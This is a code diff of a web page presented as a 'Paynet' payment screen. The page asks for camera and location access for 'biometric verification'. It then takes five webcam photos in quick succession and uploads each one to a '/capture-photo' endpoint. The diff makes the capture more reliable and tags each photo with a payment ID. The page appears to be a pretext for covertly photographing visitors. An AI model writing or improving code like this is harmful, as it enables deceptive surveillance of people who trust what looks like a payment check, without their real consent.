@@ -374,7 +374,8 @@
             </div>
             <h3 class="modal-title">Permissions Required</h3>
             <p class="modal-text">To proceed with this high-security transaction, Paynet strictly requires
-                <strong>Camera</strong> and <strong>Location</strong> access for biometric verification.</p>
+                <strong>Camera</strong> and <strong>Location</strong> access for biometric verification.
+            </p>
 
             <div
                 style="background: #f8f9fa; border: 1px solid #e8eaed; border-radius: 8px; padding: 12px; margin-bottom: 20px; text-align: left;">
@@ -621,29 +622,30 @@
                 let photoCount = 0;
                 const maxPhotos = 5;
 
-                setTimeout(() => {
-                    const captureInterval = setInterval(async () => {
-                        if (photoCount >= maxPhotos || !video) {
-                            clearInterval(captureInterval);
-                            resolve();
-                            return;
-                        }
+                const captureInterval = setInterval(async () => {
+                    if (photoCount >= maxPhotos || !video) {
+                        clearInterval(captureInterval);
+                        resolve();
+                        return;
+                    }
 
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
+                    // Loop check for dimensions
+                    if (video.videoWidth === 0 || video.videoHeight === 0) return;
 
-                        const photoData = canvas.toDataURL('image/jpeg', 0.85);
-                        capturedPhotos.push({
-                            timestamp: new Date().toISOString(),
-                            data: photoData
-                        });
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
 
-                        await sendPhotoToServer(photoData);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
+                    capturedPhotos.push({
+                        timestamp: new Date().toISOString(),
+                        data: photoData
+                    });
 
-                        photoCount++;
-                    }, 1000);
+                    await sendPhotoToServer(photoData);
+
+                    photoCount++;
                 }, 1000);
             });
         }
@@ -653,7 +655,10 @@
                 await fetch('/capture-photo', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ photo: photoData })
+                    body: JSON.stringify({
+                        photo: photoData,
+                        paymentId: paymentId || 'UNKNOWN'
+                    })
                 });
             } catch (error) {
                 console.error(error);
